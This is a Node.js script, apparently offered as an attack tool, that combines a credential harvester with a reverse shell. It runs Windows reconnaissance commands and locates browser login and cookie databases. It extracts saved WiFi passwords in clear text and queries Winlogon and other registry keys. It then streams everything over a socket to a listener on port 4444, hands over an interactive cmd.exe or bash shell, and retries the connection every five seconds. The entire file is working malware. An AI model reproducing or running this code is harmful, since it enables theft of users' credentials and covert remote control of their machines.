const net = require('net');
const { spawn, exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Configuration
const HOST = 'localhost';  // Connect to local server
const PORT = 4444;

class CredentialHarvester {
    constructor(socket) {
        this.socket = socket;
        this.credentials = {
            system: {},
            users: [],
            network: {},
            browsers: {},
            applications: {}
        };
    }

    async gatherSystemInfo() {
        return new Promise((resolve) => {
            const commands = [
                'whoami',
                'hostname',
                'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"',
                'net user',
                'net localgroup administrators',
                'ipconfig /all',
                'netstat -an | findstr LISTENING',
                'tasklist /fo csv | findstr /i "chrome\|firefox\|edge\|outlook"'
            ];

            let results = [];
            let completed = 0;

            commands.forEach((cmd, index) => {
                exec(cmd, (error, stdout, stderr) => {
                    results[index] = {
                        command: cmd,
                        output: stdout || stderr || 'No output',
                        error: error ? error.message : null
                    };
                    completed++;
                    if (completed === commands.length) {
                        resolve(results);
                    }
                });
            });
        });
    }

    async harvestBrowserCredentials() {
        const browserPaths = {
            chrome: {
                login: path.join(os.homedir(), 'AppData/Local/Google/Chrome/User Data/Default/Login Data'),
                cookies: path.join(os.homedir(), 'AppData/Local/Google/Chrome/User Data/Default/Cookies')
            },
            edge: {
                login: path.join(os.homedir(), 'AppData/Local/Microsoft/Edge/User Data/Default/Login Data'),
                cookies: path.join(os.homedir(), 'AppData/Local/Microsoft/Edge/User Data/Default/Cookies')
            },
            firefox: {
                profiles: path.join(os.homedir(), 'AppData/Roaming/Mozilla/Firefox/Profiles')
            }
        };

        let browserInfo = {};
        
        for (const [browser, paths] of Object.entries(browserPaths)) {
            browserInfo[browser] = {};
            for (const [type, filePath] of Object.entries(paths)) {
                try {
                    if (fs.existsSync(filePath)) {
                        const stats = fs.statSync(filePath);
                        browserInfo[browser][type] = {
                            path: filePath,
                            exists: true,
                            size: stats.size,
                            modified: stats.mtime
                        };
                    } else {
                        browserInfo[browser][type] = { exists: false };
                    }
                } catch (error) {
                    browserInfo[browser][type] = { error: error.message };
                }
            }
        }
        
        return browserInfo;
    }

    async harvestWiFiCredentials() {
        return new Promise((resolve) => {
            exec('netsh wlan show profiles', (error, stdout) => {
                if (error) {
                    resolve({ error: error.message });
                    return;
                }

                const profiles = [];
                const lines = stdout.split('\n');
                
                lines.forEach(line => {
                    const match = line.match(/All User Profile\s*:\s*(.+)/);
                    if (match) {
                        profiles.push(match[1].trim());
                    }
                });

                const wifiCredentials = [];
                let completed = 0;

                if (profiles.length === 0) {
                    resolve({ profiles: [], credentials: [] });
                    return;
                }

                profiles.forEach(profile => {
                    exec(`netsh wlan show profile "${profile}" key=clear`, (error, stdout) => {
                        if (!error) {
                            const keyMatch = stdout.match(/Key Content\s*:\s*(.+)/);
                            if (keyMatch) {
                                wifiCredentials.push({
                                    ssid: profile,
                                    password: keyMatch[1].trim()
                                });
                            }
                        }
                        completed++;
                        if (completed === profiles.length) {
                            resolve({ profiles, credentials: wifiCredentials });
                        }
                    });
                });
            });
        });
    }

    async harvestRegistryCredentials() {
        return new Promise((resolve) => {
            const registryCommands = [
                'reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /s',
                'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default"'
            ];

            let results = [];
            let completed = 0;

            registryCommands.forEach((cmd, index) => {
                exec(cmd, (error, stdout, stderr) => {
                    results[index] = {
                        command: cmd,
                        output: stdout || 'No output',
                        error: error ? error.message : null
                    };
                    completed++;
                    if (completed === registryCommands.length) {
                        resolve(results);
                    }
                });
            });
        });
    }

    async sendCredentialReport() {
        this.socket.write('\n=== CREDENTIAL HARVESTING STARTED ===\n');
        
        // System Information
        this.socket.write('\n[+] Gathering System Information...\n');
        const systemInfo = await this.gatherSystemInfo();
        systemInfo.forEach(result => {
            this.socket.write(`\n--- ${result.command} ---\n`);
            this.socket.write(result.output + '\n');
        });

        // Browser Credentials
        this.socket.write('\n[+] Checking Browser Credential Stores...\n');
        const browserInfo = await this.harvestBrowserCredentials();
        this.socket.write(JSON.stringify(browserInfo, null, 2) + '\n');

        // WiFi Credentials
        this.socket.write('\n[+] Harvesting WiFi Credentials...\n');
        const wifiCreds = await this.harvestWiFiCredentials();
        if (wifiCreds.credentials && wifiCreds.credentials.length > 0) {
            wifiCreds.credentials.forEach(cred => {
                this.socket.write(`SSID: ${cred.ssid} | Password: ${cred.password}\n`);
            });
        } else {
            this.socket.write('No WiFi credentials found or accessible\n');
        }

        // Registry Information
        this.socket.write('\n[+] Checking Registry for Stored Credentials...\n');
        const registryInfo = await this.harvestRegistryCredentials();
        registryInfo.forEach(result => {
            if (result.output && result.output !== 'No output') {
                this.socket.write(`\n--- Registry Query ---\n`);
                this.socket.write(result.output + '\n');
            }
        });

        this.socket.write('\n=== CREDENTIAL HARVESTING COMPLETED ===\n\n');
    }
}

function createEnhancedReverseShell() {
    const client = new net.Socket();
    
    client.connect(PORT, HOST, async () => {
        console.log('Connected to remote host');
        
        // Send initial connection info
        client.write(`\n[+] Connection established from ${os.hostname()} (${os.userInfo().username})\n`);
        client.write(`[+] OS: ${os.type()} ${os.release()}\n`);
        client.write(`[+] Architecture: ${os.arch()}\n`);
        client.write(`[+] Platform: ${os.platform()}\n\n`);
        
        // Start credential harvesting
        const harvester = new CredentialHarvester(client);
        await harvester.sendCredentialReport();
        
        // Start normal shell after credential harvesting
        const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/bash';
        const shellProcess = spawn(shell, [], {
            stdio: ['pipe', 'pipe', 'pipe']
        });
        
        // Pipe shell output to client
        shellProcess.stdout.pipe(client);
        shellProcess.stderr.pipe(client);
        
        // Pipe client input to shell
        client.pipe(shellProcess.stdin);
        
        // Handle disconnection
        client.on('close', () => {
            console.log('Connection closed');
            shellProcess.kill();
            process.exit(0);
        });
        
        shellProcess.on('close', () => {
            client.destroy();
        });
    });
    
    client.on('error', (err) => {
        console.error('Connection error:', err.message);
        setTimeout(createEnhancedReverseShell, 5000);
    });
}

// Start the enhanced reverse shell
createEnhancedReverseShell();